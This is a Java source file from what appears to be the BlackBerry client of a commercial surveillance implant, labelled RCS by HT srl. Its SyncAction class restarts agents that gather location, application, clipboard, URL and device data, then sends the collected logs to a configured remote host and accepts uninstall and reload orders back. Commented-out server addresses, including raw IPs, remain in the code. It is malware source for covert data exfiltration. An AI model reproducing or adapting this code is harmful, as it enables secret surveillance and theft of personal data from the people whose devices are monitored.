//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SyncAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;
import blackberry.AgentManager;
import blackberry.agent.Agent;
import blackberry.event.Event;
import blackberry.log.LogCollector;
import blackberry.transfer.Transfer;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class SyncAction.
 */
public class SyncAction extends SubAction {
    //#ifdef DEBUG
    private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
    //#endif

    LogCollector logCollector;
    AgentManager agentManager;
    Transfer transfer;

    protected boolean wifiForced;
    protected boolean wifi;
    protected boolean gprs;

    boolean ssl = false;

    String host = "";
    int port = 80;

    boolean syncying;

    /**
     * Instantiates a new sync action.
     * 
     * @param actionId_
     *            the action id_
     * @param confParams
     *            the conf params
     */
    public SyncAction(final int actionId_, final byte[] confParams) {
        this(actionId_);
        parse(confParams);

        //#ifdef DBC
        Check.requires(actionId == ACTION_SYNC, "Wrong ActionId");
        //#endif

        logCollector = LogCollector.getInstance();
        agentManager = AgentManager.getInstance();
        transfer = Transfer.getInstance();
    }

    /**
     * Instantiates a new sync action.
     * 
     * @param host_
     *            the host_
     */
    public SyncAction(final String host_) {
        super(ACTION_SYNC);
        host = host_;
    }

    protected SyncAction(int actionId) {
        super(actionId);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(final Event triggeringEvent) {
        //#ifdef DEBUG_INFO
        debug.info("SyncAction execute: " + triggeringEvent);
        //#endif

        synchronized (this) {
            if (syncying) {
                //#ifdef DEBUG
                debug.warn("Already syncing: skipping");
                //#endif
                return true;
            } else {
                syncying = true;
            }
        }

        try {

            if (statusObj.crisis()) {
                //#ifdef DEBUG
                debug.warn("SyncAction - no sync, we are in crisis");
                //#endif
                return false;
            }

            wantReload = false;
            wantUninstall = false;

            //#ifdef DBC
            Check.asserts(logCollector != null, "logCollector == null");
            //#endif

            //host = "192.168.1.177";
            //host = "89.96.137.6";
            //host = "iperbole.suppose.it"; port = 8080;
            transfer.init(host, port, ssl, wifiForced, wifi, gprs);

            // Stop degli agenti che producono un singolo log
            agentManager.reStart(Agent.AGENT_POSITION);
            agentManager.reStart(Agent.AGENT_APPLICATION);
            agentManager.reStart(Agent.AGENT_CLIPBOARD);
            agentManager.reStart(Agent.AGENT_URL);

            // l'agente device si comporta diversamente
            agentManager.reStart(Agent.AGENT_DEVICE);

            Utils.sleep(2500);

            final boolean ret = transfer.startSession();

            wantUninstall = transfer.uninstall;
            wantReload = transfer.reload;

            if (ret) {
                //#ifdef DEBUG_TRACE
                debug.trace("InternetSend OK");
                //#endif
                return true;
            }

            //#ifdef DEBUG
            debug.error("InternetSend Unable to perform");
            //#endif

            return false;
        } finally {
            synchronized (this) {
                syncying = false;

            }
        }
    }

    private Object getApn() {
        // TODO Auto-generated method stub
        return null;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            gprs = databuffer.readInt() == 1;
            wifi = databuffer.readInt() == 1;
            wifiForced = wifi;

            final int len = databuffer.readInt();
            final byte[] buffer = new byte[len];
            databuffer.readFully(buffer);

            host = WChar.getString(buffer, true);

        } catch (final EOFException e) {
            //#ifdef DEBUG
            debug.error("params FAILED");
            //#endif
            return false;
        }

        //#ifdef DEBUG
        StringBuffer sb = new StringBuffer();
        sb.append("gprs: " + gprs);
        sb.append(" wifi: " + wifi);
        sb.append(" host: " + host);
        debug.info(sb.toString());
        //#endif

        return true;
    }

}
